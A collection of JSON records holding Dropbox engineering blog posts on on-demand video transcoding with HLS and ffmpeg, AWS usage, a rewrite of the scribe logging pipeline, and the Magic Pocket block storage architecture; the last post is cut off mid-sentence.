{"website": "Dropbox", "title": "Video Processing at Dropbox", "author": ["Pierpaolo Baccichet"], "link": "https://dropbox.tech/infrastructure/video-processing-at-dropbox", "abstract": "HTTP Live Streaming is your friend System overview Preparing, encoding and segmenting Lowering startup time by pre-transcoding Recap Every day millions of people upload videos to Dropbox. Besides wanting their memories safe forever, they also want to be able to watch them at any time and on any device. The playout experience should feel instant, despite the fact that the content is actually stored remotely. Low latency playback of content poses interesting technical challenges because of the three main factors below. 1. Codec diversity Most end users are familiar with extensions like .mp4, .avi, .flv, but not everybody is familiar with the fact that the file extension does not necessarily match the internal encoding of the content. People assume that an .mp4 file will certainly play on a Mac laptop, but that’s not always a safe assumption because the content might be encoded with some Microsoft/Google/Adobe/RealMedia specific codec (e.g. VC1/VP8). The video codec landscape has been very fragmented for at least 30 years now, and despite the efforts of MPEG to create open standards, the situation is still quite messy. The good news is that modern phones tend to produce mostly coherent content using H.264/AVC as codec and MPEG-4 container format, which indeed corresponds to the majority of the content we see in Dropbox. 2. Limited end-user network bandwidth Users access their Dropbox content either via their home/office connection or via a mobile connection. Leaving mobile aside, even home connections are not as fast/reliable as most network providers advertise (see the ISP speed report from Netflix for some fun numbers), so bandwidth adaptation is a must to guarantee a fluid video playout. 3. Client capabilities Different client devices impose different constraints, mostly due to the underlying hardware chipsets, both in terms of memory bandwidth and CPU power. For instance, the iPhone 3GS only supports baseline profile H.264/AVC. The solution to these problems is to transcode (decode and re-encode) the source video to a target resolution/bit rate and codec that is suitable for a given client. At the beginning of the development of this feature, we entertained the idea to simply pre-transcode all the videos in Dropbox to all possible target devices. Soon enough we realized that this simple approach would be too expensive at our scale, so we decided to build a system that allows us to trigger a transcoding process only upon user request and cache the results for subsequent fetches. This on-demand approach: adapts to heterogeneous devices and network conditions, is relatively cheap (everything is relative at our scale), guarantees low latency startup time. HTTP Live Streaming is your friend We managed to achieve our first 2 goals above by using HTTP Live Streaming (HLS). The basic idea of HLS is to structure the data in several playlists describing quality layers and data segments that are transmitted over HTTP. The standard was born as an Apple specific solution but is now an open RFC and is also (partially) supported on Android devices. The protocol effectively works in 3 steps that the player has to follow sequentially. The very first URL a player hits returns the main HLS playlist file that looks in our case something like: Copy #EXTM3U\n#EXT-X-PLAYLIST-TYPE:VOD\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=150000\nhttps://streaming.dropbox.com/stream/&lt;access_token_layer_1&gt;\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=500000\nhttps://streaming.dropbox.com/stream/&lt;access_token_layer_2&gt;\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=1500000\nhttps://streaming.dropbox.com/stream/&lt;access_token_layer_3&gt;\n#EXT-X-ENDLIST Each #EXT-X-STREAM-INF tag provides a URL to a playlist for content at a different target bit rate. In the example above, we have 3 layers at increasing qualities, so the player can pick the best one for a given connection speed. The second step consists of fetching the layer playlists, potentially parallelizing the operation for all layers to save roundtrip time. Each layer playlist looks something like: Copy #EXT-X-VERSION:3\n#EXT-X-PLAYLIST-TYPE:VOD\n#EXT-X-TARGETDURATION:10\n#EXTINF:10.0,\nhttps://streaming.dropbox.com/stream/&lt;access_token_layer_1_segment_1&gt;\n#EXTINF:10.0,\nhttps://streaming.dropbox.com/stream/&lt;access_token_layer_1_segment_2&gt;\n[...]\n#EXTINF:10.0,\nhttps://streaming.dropbox.com/stream/&lt;access_token_layer_1_segment_N&gt;\n#EXT-X-ENDLIST Unlike the first response, each URL in the layer playlist now points to a segment of actual data. Apple has very good technical notes providing generic recommendations on how to encode and segment content for HLS streaming. System overview Figure 1 – Diagram of the transcoding system To begin streaming, a client application first issues a request to our web servers to obtain a temporary token (in the form of a URL) for the main HLS playlist. Since video playout typically happens on dedicated players that are not necessarily part of a client application, the token includes a one time password and expiration information that enables our servers to authenticate the external player before returning the content to it. The handler of this first request verifies if the content is already cached and, if that’s not the case, kicks off a transcoding job with different parameters based on client capabilities and network connection. Since H.264/AVC video transcoding is an extremely intensive operation and each transcoder machine can only perform a limited number of transcodes in parallel, it's important to pick the best worker at every request. The URL we return to the client also embeds information that allows us to route the request back to the transcoding worker, which is important to be able to serve the content while it’s being transcoded and before it’s cached in our backend. Our worker clusters are implemented on Amazon AWS and consist of the following components: live transcoding servers are beefy cc2.8xlarge instances that can run several transcoding processes in parallel while still serving user’s requests. We have a hard limit on the number of concurrent transcodes on a given box and expose an application layer health check that allows us to temporarily take the machine out of service if the limit is exceeded. From our experience, each cc2.8xlarge machine can perform up to a dozen transcoding jobs in parallel before it will start falling behind. memcache is used for distributed coordination of the transcoding jobs. We use memcache to a) track progress of a job and b) report machine load. We use the load information to implement a good load balancing scheduler. This is crucial to prevent machines from getting overloaded. front end load balancer runs on cc1.xlarge instances and is powered by Nginx and HAProxy. We use Nginx for SSL termination and HAProxy to quickly take machines out of service when they are overloaded and fail the health check. persistent cache of transcoded material happens in a separate storage system. As always, storage is cheap compared to CPU so we store the results of the transcoding process for a certain amount of time to serve them back in subsequent requests. We maintain references to cached data in our internal databases so we can implement different retention policies based on users’ usage patterns. Preparing, encoding and segmenting We use ffmpeg for the actual transcoding because it supports most formats. Our pipeline implements the following three steps. 1) prepare the stream for cooking Since we want to stream data as we transcode it, we need to rearrange the input stream in a way that is suitable for piping it into ffmpeg. Many people refer to this process as “fast-starting” the video, and there are a few tools available on the internet that can help you get started. Ultimately, we wrote our own solution in python to allow us to debug issues and profile performance. In practice fast-starting for mp4 consists of extracting the \"moov atom,\" which contains most of the video's metadata, rearranging it to the beginning of the file, and then adjusting the internal offsets to the data accordingly. This allows ffmpeg to immediately find the information about resolution, duration and location of data atoms and start the transcoding as the data is fed into it. 2) re-encode the stream The command line for ffmpeg looks something like the following: Copy ffmpeg -i pipe:0 -dn -vcodec libx264 -vsync 1 -pix_fmt yuv420p -ac 2 \n  -profile:v baseline -level 30 -x264opts bitrate=&lt;rate&gt;:vbv-maxrate=&lt;rate&gt; \n  -rc-lookahead 0 -r &lt;fps&gt; -g &lt;fps&gt; -refs 1 -acodec libfaac -async 1 \n  -ar 44100 -ab 64k -f mpegts -s &lt;target_resolution&gt; -muxdelay 0 pipe:1 We use H.264/AVC baseline profile level 3.0 to guarantee compatibility with all devices including iPhone 3GS (we are planning to improve on that in the near future). Some of the parameters are the result of us trading off a bit of quality to minimize the startup time for live transcoding. Specifically, we found that reducing the value of muxdelay, having only one reference frame and disabling scenecut detection all contributed in reducing the latency introduced by ffmpeg. The output container format is MPEG transport as required by HLS. 3) Segment the transcoded output The output of ffmpeg is segmented with a C++ tool we developed internally on top of libavcodec. Apple provides a segmenter tool but we decided to not use it because it runs only on Mac (we are linux friends like most readers here) and does not natively support pipelining. Also, recent versions of ffmpeg (we use 2.0) come with a segmenter tool, but we found it introduces significant latency to our pipeline. In summary, the reasons why we ended up writing our own tool were because it allows us to 1) optimize end-to-end latency, 2) guarantee the presence and the positioning of IDR (Instantaneous Decoder Refresh) frames in every segment and 3) customize the length of the segments we generate. The last point is particularly important because the length of the video segment is directly proportional to the transmission time from the server to the client on a bandwidth constrained channel. On one hand, we want very short segments to lower the transmission time of each of them but on the other hand we’d like to minimize the number of in-flight requests and the overhead per request due to the roundtrip latency between the client and the server. Since we are optimizing for startup latency, we begin with smaller segments and then ramp up to longer ones to diminish request overhead, up to the target segment length of 5 seconds per segment. Specifically, the length for the very first segments looks something like 2s, 2s, 3s, 3s, 4s, 4s, 5s, …. We picked these values because a) the standard poses some restrictions on how fast we can increase the length of consecutive segments (this is to avoid possible underflows) and Android does not allow for fractional segment lengths (those were introduced in version 3 of the HLS standard). Lowering startup time by pre-transcoding During the development and tuning process of the pipeline we saw the startup time reducing dramatically from ~15/20 seconds to ~5 seconds, as you can see from the rocky graph below. Figure 2 - Transcoder startup time Still, that is not sufficient to provide the “feel instant” experience we wanted for our users so we revisited the idea of pre-transcoding some of the material and we decided to process only the first few seconds of every video. The pre-transcoding cluster is independent of the live transcoding one to not affect the performance of live traffic and is hooked up with a pipeline that is triggered on every file upload. The first few seconds of every video are processed and stored in our cache, and the remaining part is generated on demand whenever the user requests. This approach allows us to transmit to the client the first segments very quickly while the transcoder starts up and seeks to the desired offset. We retain references to all processed material so we can easily implement different retention policies as needed. Recap The combination of pre-transcoding, shorter segments at the beginning and lowered buffering time in the video processing pipeline allowed to reach our goal of 2-3 seconds startup time on a client on a good connection, providing the desired instant experience. We learned a few things when building the system at scale: pre-transcoding everything would be nice and makes things much easier to implement, however it’s too expensive at our scale. fast-starting is required to handle video files generated by mobile devices if you want the transcoder to progress while you feed data into it. HLS is a great solution to enable streaming over heterogeneous networks/devices and allows for flexible and creative solutions in the way you structure your output. load balancing is not to be underestimated. It’s a tricky problem and can easily trash your system if done wrong. experimenting with ffmpeg parameters lets you explore the tradeoff between quality and latency that is appropriate for your application. // Tags Infrastructure Video // Copy link Link copied Link copied", "date": "2014-02-18"},
{"website": "Dropbox", "title": "Dropbox at AWS re:Invent 2014", "author": ["Tom Cook"], "link": "https://dropbox.tech/infrastructure/aws-reinvent-2014", "abstract": "Dropbox is an active customer of Amazon Web Services , currently operating one of the largest global deployments into S3 , tens of thousands of EC2 instances, and heavily utilizing other services like SQS and Route 53 . Pushing hundreds of gigabits per second through EC2/S3 is an everyday occurrence for us, and conducting massively parallel operations across our over one trillion objects in S3 happens on an ongoing basis. However, that’s just half the story. We also have large physical datacenters split between two geographical regions, running tens of thousands of servers responsible for storing and serving the metadata for every file in Dropbox. Managing the metadata for the one billion files saved every day means that these servers have to be extremely fast and reliable. Orchestrating the hundreds of backend services that comprise Dropbox is an ongoing challenge for our infrastructure team, along with keeping up with growth and reliability. Two weeks ago, at the AWS re:Invent conference, we presented a deep-dive into one of the systems that allows us to perform operations for every Dropbox file update in near-realtime. This enables features like fast photo thumbnails and video previews for Carousel , multi-platform Microsoft Office document previews , and realtime full-text search . The system bridges our physical datacenters and AWS using SQS as a fast, reliable, no-maintenance message bus that sustains ~20,000 requests per second on average, but often bursts to ~300,000 per second. Another part of Dropbox is Mailbox , a completely reimagined email client for iOS, Android, and Mac OS X. Mailbox operates wholly on AWS and heavily leverages additional AWS services to keep their team lean and iterate quickly. Simple Notification Service ‘s (SNS) support for mobile push has enabled the team to quickly support new platforms and scale their push notification pipeline with almost no effort. Sean Beausoleil, an engineering lead on the Mailbox team, spoke at re:Invent about why they chose SNS and how it’s since become a foundation component of the Mailbox service ( starts at 36:49 ). Dropbox’s infrastructure and usage has grown exponentially since our launch in 2008, yet we still run everything with a small team of fewer than 100 infrastructure engineers in San Francisco , Seattle , and New York City . We’re always looking for driven, creative engineers to join the team and to push both AWS and our physical infrastructure to their limits, either as Site Reliability Engineers or Infrastructure Software Engineers . // Tags Infrastructure // Copy link Link copied Link copied", "date": "2014-12-04"},
{"website": "Dropbox", "title": "How to Write a Better Scribe", "author": ["Patrickdropbox"], "link": "https://dropbox.tech/infrastructure/how-to-write-a-better-scribe", "abstract": "Scribe Basics How Can We Make Scribe Better? Architecture Comparison Like many companies, Dropbox uses scribe to aggregate log data into our analytics pipeline. After a recent scribe pipeline outage, we decided to rewrite scribe with the goals of reducing operational overhead, reducing data loss, and adding enhancements that are missing from the original scribe. This blog post describes some of the design choices we made for the rewrite. Scribe Basics This section describes the scribe pipeline with respect to how it is setup at Dropbox (we suspect most companies deploy/use scribe in similar fashion).  Feel free to skip this section if you are already familiar with scribe. A scribe server can be thought of as an input-queued network switch which performs routing based on the message’s category.  The server’s configurations, including its upstream locations, are loaded on startup from an xml-like config file.  The upstreams may be either other scribe nodes, hdfs (or local file), or a sink which drops all messages. Scribe’s primary client interface is Log (list of (category, message)-tuples) -> status When a client sends a batch of messages to a scribe server, the scribe server forwards each message in the batch to the corresponding upstream and returns “ok” to the client to indicate success.  If the message batch is throttled, the server returns “try again” to client and the client should retry sending at a later time. Scribe nodes are typically configured into a fan-in tree topology.  At Dropbox, we deploy scribe nodes in a 3-tier (leaf, remote hub and central hub) fan-in tree configuration: Application (production services, scripts, etc.) scribe clients are topology-agnostic and can only talk to the local leaf node running on the same machine (i.e., Leaf nodes run on every machine in our fleet).  Each leaf scribe node is configured to randomly forward log messages to a small subset of remote hub scribe upstreams. The remote hub tier is our primary message buffering tier.  We want to minimize buffering on the leaf tier since leaf nodes runs on the serving machines and thus compete with serving systems for memory and disk IO.  Remote hub scribe nodes will forward messages to the correct central node based on a hash of the message’s category. The central hub tier is responsible for appending message into HDFS files; messages for the same category are appended to the same file.  HDFS does not support multiple writers appending to the same file. This implies that each category can only be written by exactly one central hub node.  This limitation also means that every central node is a single point of failure and is a bottleneck for categories with high write throughput.  To reduce potential data loss due to central hub node crashes, our central hub tier is configured with a very small memory buffer and no disk buffer.  To improve write throughput, our application scribe client shards known high-throughput categories by appending shard suffixes to these categories.  Our analytics pipeline then merges the sharded categories back into a single category. Since parts of Dropbox’s serving stack runs on EC2 , while our analytics pipeline runs entirely within our datacenter, we have to transfer EC2 logs into our datacenter. For this purpose, an extra EC2 remote hub tier is setup to forward logs into our standard scribe fan-in tree. Note that all traffic between EC2 and our datacenter goes through secure tunnels. How Can We Make Scribe Better? With the basics out of the way, let us dive into some key issues with the original scribe.  We will henceforth refer to the original scribe as OldScribe and the rewrite as NewScribe wherever the distinction matters, and simply scribe if there is no distinction. 1. Config management: Problem : OldScribe’s configurations are stored in xml-like config files.  Whenever configuration changes, we need to restart nodes to pick up the changes.  While this approach works well for tens, maybe even hundreds, of nodes, this approach is unsustainable for tens of thousands of nodes.  In particular, it is difficult to ensure the entire fleet is running on the most up-to-date configurations, and it is unpleasant to restart nodes on the entire fleet.  This is especially problematic for leaf nodes since adding remote hub nodes requires manually modifying and syncing the leaf’s configuration before restarting all of them. Solution : NewScribe solves these issues by storing the configurations in zookeeper .  Whenever configurations change in zookeeper, NewScribe will pick up the changes and reconfigure itself automatically (without restarting).  NewScribe also supports service discovery; this eliminates the need to manually update configuration whenever the scribe upstream changes. 2. Throttling: Problem : OldScribe’s throttling occurs on ingress.  When a message batch comes into OldScribe, OldScribe will look for category queues associated to the message batch; if any of the queues is full, then the entire message batch is rejected and the OldScribe will ask the downstream client to “try again”.  This scheme works well when the message batch contains only a single category.  However, when the message batch contains multiple categories, this scheme can cause unintentional head of line blocking (assuming the downstream client retries).  Worst yet, if the downstream client ignores the “try again” directive, the messages are lost forever.  Also, note that this scheme is very wasteful since a lot of network bandwidth and cpu are wasted on retries. Solution : NewScribe’s throttling occurs on egress.  It always accepts incoming messages and attempts to buffer as much as it can until the category’s queue is full; this eliminates accidental head of line blocking.  To ensure upstreams are not overwhelmed, each category’s upstream writing is rate limited by a leaky bucket . 3. Queuing: Problem : OldScribe treats each category’s memory buffer and disk buffer as a single logical queue. Solution : NewScribe treats the memory buffer and disk buffer as individual queues.  Message ordering is not preserved. When a message enters the system, NewScribe will try to put the message into the memory queue first.  If the memory queue is full, then NewScribe will try to put the message into the disk queue (if that fails, the message is dropped). The upstream writer will grab messages from both queues and will send messages upstream when at least one queue has messages.  This allows some messages to bypass the disk queue which reduces disk IO stress, and allows the upstream writer to continue processing the memory queue at full speed while the disk queue pauses to load more messages. NOTE: message ordering does not matter too much since the analytics pipeline must handle message reordering regardless of how scribe writes the messages. 4. Single point of failure: Problem : Currently, our application scribe client assigns each message’s category with a shard suffix. The OldScribe remote hub will route the message to a specific OldScribe central hub based on the hash (category with suffix).  Since the routing is predetermined by the application scribe client, whenever an OldScribe central hub dies, messages destined for that central hub will get backlogged until we replace that node. (Partial) Solution : For sharded categories, NewScribe ignores the shard suffix provided by downstream and assigns each upstream message batch with a new shard suffix; the shard suffixes are round robin, hence we’re rotating upstreams at the same time (and thus ensuring progress in face of single upstream node failure).  For unsharded categories, single point of failure remains an issue (This is partly the motivation for migrating to Kafka; see below).  NOTE: we can “fix” the single point of failure by forcing each category to have at least 2 shards. 5. Disk buffering: Problem : OldScribe creates a new file every time it flushes to disk.  The un-checksummed files are all written into the same directory.  When it tries to upstream the disk buffer, it loads the entire file and sends the entire file as a single message batch.  This is problematic since it creates a ton of log files in a single directory, which makes the os unhappy.  Whenever file corruption occurs, OldScribe may enter into an endless crash loop. Solution : NewScribe uses checksummed logs with rotations/checkpoints to handle writing to/reading from disk queues.  Each disk queue is composed of a reader thread and a writer thread.  The reader thread will only operate on immutable log files, while the writer thread will operate on a single mutable log file at any given time.  Mutable log files are rotated (and become immutable) on one of two conditions: the reader thread is starving the log file has reached a certain size Each category’s logs are written into a different subdirectories. 6. Alternative storage: Problem : Our analytics team want to replace HDFS with Kafka to take advantage of newer analytics tool such as Storm .  To support that in OldScribe, we will need either a scribe-to-kafka shim server or a server that tails HDFS; both solutions are unattractive since they both introduce yet another server into our already complex ecosystem. Solution : NewScribe natively supports writing to kafka upstreams. Architecture Comparison For comparison, here are the architecture block diagrams for OldScribe and NewScribe. OldScribe’s Architecture As mentioned previously, OldScribe’s architecture resembles a simple network switch.  Its (logical) architecture is as follow: Each category runs in its own thread (The individual components within a category are just library calls to the common abstract Store interface).  Notice the lack of control plane since routing configuration are loaded during startup. NewScribe’s Architecture NewScribe’s architecture also resembles a network switch.  Its architecture is as follows: Control Plane: Config manager: listens to zookeeper for any configuration changes and notifies category config updater when changes occurs Upstream manager: keeps track of (scribe / kafka) upstream connection pools.  It also keeps track of discoverable scribe upstream services, and notifies category config updater whenever upstream services change. Category config updater: updates all registered categories’ throttling, buffering, and upstream configurations whenever it receive an notification from either the config manager or the upstream manger. Data Plane: Memory queue: is just a standard thread-safe in-memory queue Disk queue: is composed of a background writer thread which writes messages to log files, and a background reader thread which actively loads messages from logs files. upstream writer: is responsible for pulling events from both memory and disk queues and sending the messages upstream(s).  The upstreams are configured by the control plane. While we cannot open-source our rewrite at current time because it is tightly coupled to Dropbox’s internal infrastructure, we hope this post provides enough details for you to re-implement your own. Per usual, we’re looking for awesome engineers to join our team in San Francisco , Seattle and New York , especially Infrastructure Software Engineers and Site Reliability Engineers ! Contributors: John Watson, Patrick Lee, and Sean Fellows // Tags Infrastructure Logging Scribe // Copy link Link copied Link copied", "date": "2015-05-20"},
{"website": "Dropbox", "title": "Inside the Magic Pocket", "author": ["Jamesacowling"], "link": "https://dropbox.tech/infrastructure/inside-the-magic-pocket", "abstract": "Immutable block storage Workload Durability Scale Simplicity Data Model Architecture Protocol Put Get Repair Wrap-up We’ve received a lot of positive feedback since announcing Magic Pocket , our in-house multi-exabyte storage system. We’re going to follow that announcement with a series of technical blog posts that offer a look behind the scenes at interesting aspects of the system, including our protection mechanisms, operational tooling, and innovations on the boundary between hardware and software. But first, we’ll need some context: in this post, we’ll give a high level architectural overview of Magic Pocket and the criteria it was designed to meet. As we explained in our introductory post , Dropbox stores two kinds of data: file content and metadata about files and users. Magic Pocket is the system we use to store the file content. These files are split up into blocks, replicated for durability, and distributed across our infrastructure in multiple geographic regions. Magic Pocket is based on a rather simple set of core protocols, but it’s also a big, complicated system, so we’ll necessarily need to gloss over some details. Feel free to add feedback in the comments below; we’ll do our best to delve further in future posts. Note: Internally we just call the system “MP” so that we don’t have to feel silly saying the word “Magic” all the time. We’ll do that in this post as well. Requirements Immutable block storage Magic Pocket is an immutable block storage system . It stores encrypted chunks of files up to 4 megabytes in size, and once a block is written to the system it never changes. Immutability makes our lives a lot easier. When a user makes changes to a file on Dropbox we record all of the alterations in a separate system called FileJournal . This enables us to have the simplicity of storing immutable blocks while moving the logic that supports mutability higher up in the stack. There are plenty of large-scale storage systems that provide native support for mutable blocks, but they’re typically based on immutable storage primitives once you get down to the lower layers. Workload Dropbox has a lot of data and a high degree of temporal locality. Much of that data is accessed very frequently within an hour of being uploaded and increasingly less frequently afterwards. This pattern makes sense: our users collaborate heavily within Dropbox, so a file is likely to be synced to other devices soon after upload. But we still need reliably fast access: you probably don’t look at your tax records from 1997 too often, but when you do, you want them immediately. We have a fairly “cold” storage system but with the requirement of low-latency reads for all blocks. To tackle this workload, we’ve built a system based on spinning media (a fancy way of saying “hard drives”), which has the advantage of being durable, cheap, storage-dense and fairly low latency—we save the solid-state drives (SSDs) for our databases and caches. We use a high degree of initial replication and caching for recent uploads, alongside a more efficient storage encoding for the rest of our data. Durability Durability is non-negotiable in Magic Pocket. Our theoretical durability has to be effectively infinite, to the point where loss due to an apocalyptic asteroid impact is more likely than random disk failures—at that stage, we’ll probably have bigger problems to worry about. This data is erasure-coded for efficiency and stored across multiple geographic regions with a wide degree of replication to ensure protection against calamities and natural disasters. Scale As an engineer, this is the fun part. Magic Pocket had to grow from our initial double-digit-petabyte prototypes to a multi-exabyte behemoth within the span of around 6 months—a fairly unprecedented transition. This required us to spend a lot of time thinking, designing, and prototyping to eliminate the bottlenecks we could foresee. This process also helped us to ensure that the architecture was sufficiently extensible, so we could change it as unforeseen requirements arose. There were plenty of examples of unforeseen requirements along the way. In one case, traffic grew suddenly and we started saturating the routers between our network clusters. This required us to change our data placement algorithms and our request routing to better reflect cluster affinity (along with available storage capacity, cluster growth schedules, etc) and eventually to change our inter-cluster network architecture altogether. Simplicity As engineers we know that complexity is usually antithetical to reliability. Many of us have spent enough time writing complex consensus protocols to know that spending all day reimplementing Paxos is usually a bad idea. MP eschews quorum-style consensus or distributed coordination as much as possible, and heavily leverages points of centralized coordination when performed in a fault-tolerant and scalable manner.  There were times when we could have opted for a distributed hash table or trie for our Block Index and instead just opted for a giant sharded MySQL cluster; this turned out to be a really great decision in terms of simplifying development and minimizing unknowns. Data Model Before we get to the architecture itself, first let’s work out what we’re storing. MP stores blocks , which are opaque chunks of files, up to 4MB in size: These blocks are compressed and encrypted and then passed to MP for storage. Each block needs a key or name, which for most of our use-cases is a SHA-256 hash of the block. 4MB is a pretty small amount of data in a multi-exabyte storage system however and too small a unit of granularity to move around whenever we need to replace a disk or erasure code some data. To make this problem tractable, we aggregate these blocks into 1GB logical storage containers called buckets . The blocks within a given bucket don’t necessarily have anything in common; they’re just blocks that happened to be uploaded around the same time. Buckets need to be replicated across multiple physical machines for reliability. Recently uploaded blocks get replicated directly onto multiple machines, and then eventually the buckets containing the blocks are aggregated together and erasure coded for storage efficiency. We use the term volume to refer to one or more buckets replicated onto a set of physical storage nodes. To summarize: A block , identified by its hash , gets written to a bucket . Each bucket is stored in a volume across multiple machines, in either replicated or erasure coded form. Architecture So now that we know our requirements and data model, what does Magic Pocket actually look like? Well, something like this: That might not look like much, but it’s important. MP is a multi-zone architecture, with server clusters in western, central and eastern United States. Each block in MP is stored independently in at least two separate zones and then replicated reliably within these zones. This redundancy is great for avoiding natural disasters and large-scale outages but also allows us to establish very clear administrative domains and abstraction boundaries to avoid a misconfiguration or congestion collapse from cascading across zones. [We have some extensions in the works for less-frequently accessed (“colder”) data that adopts a different multi-zone architecture than this.] Most of the magic happens inside a zone however, so let’s dive in: We’ll go through these components one by one . Frontends These nodes accept storage requests from outside the system , and are the gateway to Magic Pocket . They determine where a block should be stored and issue commands inside MP to read or write the block. Block Index This is the service that maps each block to the bucket where it’s stored. You can think of this as a giant database with the following schema: Copy hash → cell, bucket, checksum ( Our real schema is a little more complicated than this to support things like deletes, cross-zone replication, etc . ) The Block Index is a giant sharded MySQL cluster , fronted by an RPC service layer , plus a lot of tooling for database operations and reliability. We’d originally planned on building a dedicated key-value store for this purpose but MySQL turned out to be more than capable. We already had thousands of database nodes in service across the Dropbox stack , so this allowed us to leverage the operational competency we’ve built up around managing MySQL at scale. We might build a more sophisticated system eventually , but we’re happy with this for now. Key-value stores are fashionable and offer high performance , but databases are highly reliable and provide an expressive data model which has allowed us to easily expand our schema and functionality over time. Cross-zone replication The cross-zone replication daemon is responsible for asynchronously replicating all block puts from one zone to the other. We write each block to a remote zone within one second of it being uploaded locally. We factor this replication delay into our durability models and ensure that the data is replicated sufficiently widely in the local zone. Cells Cells are self-contained logical storage clusters that store around 50PB of raw data . Whenever we want to add more space to MP we typically bring up a new cell. While the cells are completely logically independent , we stripe each cell across our racks to ensure maximal physical diversity within a cell. Let’s dive inside a cell to see how it works: Object Storage Devices (OSDs) The most important characters in a cell are the OSDs , storage boxes full of disks that can store over a petabyte of data in a single machine, or over 8 PB per rack. There’s some very complex logic on these devices for managing caching , disk scheduling , and data validation , but from the perspective of the rest of the system these are “dumb” nodes : they store blocks but don’t understand the cell topology or participate in distributed protocols . Replication Table The Replication Table is the index into the cell which maps each logical bucket of data to the volume and OSDs that bucket is stored on. Like the Block Index, the Replication Table is stored as a MySQL database but is much smaller and updated far less frequently. The working set for the Replication Table fits entirely in memory on these databases which gives us very high read throughput on a small number of physical machines. The schema on the Replication Table looks something like this: Copy bucket → volume\r\nvolume → OSDs, open, type, generation One important concept here is the open flag, which dictates whether the volume is “open” or “closed”. An open volume is open for writing new data but nothing else. A closed volume is immutable and may be safely moved around the cell. Only a small number of volumes are open at any point in time. The type specifies the type of volume: a replicated volume or encoded with one of our erasure coding schemes. The generation number is used to ensure consistency when moving volumes around to recover from a disk failure or to optimize storage layout. Master The Master is best thought of as the janitor or coordinator for the cell. It contains most of the complex protocol logic in the system , an d i ts main job is to watch the OSDs and trigger data repair operations whenever one fails. It also coordinates background operations like creating new storage buckets when they get full, triggering garbage collection when data is deleted, or merging buckets together when they become too small after garbage collection. The Replication Table stores the authoritative volume state so that the Master itself is entirely soft-state. Note that the Master is not on the data plane : no live traffic flows through it , and the cell can continue to serve reads if the Master is down. The cell can even receive writes without the Master, although it will eventually run out of available storage buckets without the Master creating new ones as they fill up. There are always plenty of other cells to write to if the Master isn’t around to create these new buckets. We run a single Master per cell, which provides us a centralized point of coordination for complex data-placement decisions without the significant complexity of a distributed protocol. This centralized model does impose a limit on the size of each cell : we can support around a hundred petabytes before the memory and CPU overhead becomes a bottleneck. Fortunately , having multiple cells also happens to be very convenient from a deployment perspective and provides greater isolation to avoid cascading failures. Volume Managers The Volume Managers are the heavy lifters of the cell. They respond to requests from the Master to move volumes around , or to erasure code volumes. This typically means reading from a bunch of OSDs, writing to other OSDs, and then handing control back to the Master to complete the operation. The Volume Manager processes run on the same physical hardware as the OSDs since this allows us to amortize their heavy network-capacity demands across idle storage hardware in the cell. Protocol Phew! You’ve made it this far, and hopefully have a reasonable understanding of the high-level Magic Pocket architecture. We’ll wrap up with a very cursory overview of some core MP protocols, which we can expound upon in future posts. Fortunately these protocols are already quite simple. Put The Frontends are armed with a few pieces of information in advance of receiving a Put request: they periodically contact each cell to determine how much available space it has, along with a list of open volumes that can receive new writes. When a Put request arrives, the Frontend first checks if the block already exists (via the Block Index) and then chooses a target volume to store the block. The volume is chosen from the cells in such a way as to evenly distribute cell load and minimize network traffic between storage clusters. The Frontend then consults the Replication Table to determine the OSDs that are currently storing the volume. The Frontend issues store commands to these OSDs, which all fsync the blocks to disk (or on-board SSD) before responding. If this was successful then the Frontend adds a new entry to the Block Index and can return successfully to the client. If any OSDs fail along the way then the Frontend just retries with another volume, potentially in another cell. If the Block Index fails then the Frontend forwards the request to the other zone. The Master periodically runs background tasks to clean up from any partial writes for failed operations. Put Protocol There are some subtle details behind the scenes, but ultimately it’s rather simple. If we adopted a quorum-based protocol where the Frontend was only required to write to a subset of the OSDs in a volume then we would avoid some of these retries and potentially achieve lower tail latency but at the expense of greater complexity. Judicious management of timeouts in a retry-based scheme already results in low tail latencies and gives us performance that we’re very happy with. Get Once we know the Put protocol, the process for serving a Get should be self-explanatory. The Frontend looks up the cell and bucket from the Block Index, then looks up the volume and OSDs from the Replication Table, and then fetches the block from one of the OSDs, retrying if one is unavailable. As mentioned, we store both replicated data and erasure coded data in MP. Reading from a replicated volume is easy because each OSD in the volume stores all the blocks. Reading from an erasure coded volume can be a little more tricky. We encode in such a way that each block can be read in entirety from a single given OSD, so most reads only hit a single disk spindle; this is important in reducing load on our hardware. If that OSD is unavailable then the Frontend needs to reconstruct the block by reading encoded data from the other OSDs. It performs this reconstruction with the aid of the Volume Manager. Erasure Coded Volume In the encoding scheme above, the Frontend can read Block A from OSD 1, highlighted in green. If that read fails it can reconstruct Block A by reading from a sufficient number of blocks on the other OSDs, highlighted in red. Our actual encoding is a little more complicated than this and is optimized to allow reconstruction from a smaller subset of OSDs under most failure scenarios. Repair The Master runs a number of different protocols to manage the volumes in a cell and to clean up after failed operations. But the most important operation the Master performs is Repair. Repair is the operation used to re-replicate volumes whenever a disk fails. The Master continually monitors OSD health via our service discovery system and triggers a repair operation once an OSD has been offline for 15 minutes — long enough to restart a node without triggering unnecessary repairs, but short enough to provide rapid recovery and minimize any window of vulnerability. Volumes are spread somewhat-randomly throughout a cell, and each OSD holds several thousand volumes. This means that if we lose a single OSD we can reconstruct the full set of volumes from hundreds of other OSDs simultaneously: In the diagram above we’ve lost OSD 3, but can recover volumes A, B and C from OSDs 1, 2, 4 and 5. In practice there are thousands of volumes per OSD, and hundreds of other OSDs they share this data with. This allows us to amortize the reconstruction traffic across hundreds of network cards and thousands of disk spindles to minimize recovery time. The first thing the Master does when an OSD fails is to close all the volumes that were on that OSD and instruct the other OSDs to reflect this change locally. Now that the volumes are closed, we know that they won’t accept any future writes and are thus safe to move around. The Master then builds a reconstruction plan , where it chooses a set of OSDs to copy from and a set of OSDs to replicate to, in such a way as to evenly spread load across as many OSDs as possible. This step allows us to avoid traffic spikes on particular disks or machines. The reconstruction plan allows us to provision far fewer hardware resources per OSD, and would be difficult to produce without having the Master as a central point of coordination. We’ll gloss over the data transfer process, but it involves the volume managers copying data from the sources to the destinations, erasure coding where necessary, and then handing control back to the Master. The final step is fairly simple, but critical: At this point the volume exists on both the source and destination OSDs, but the move hasn’t been committed yet. If the Master fails at this point, the volume will just stay in the old location and get repaired again by the new Master. To commit the repair operation, the Master first increments the generation number on the volumes on the new OSDs, and then updates the Replication Table to store the new volume-to-OSD mapping with the new generation (the commit point). Now that 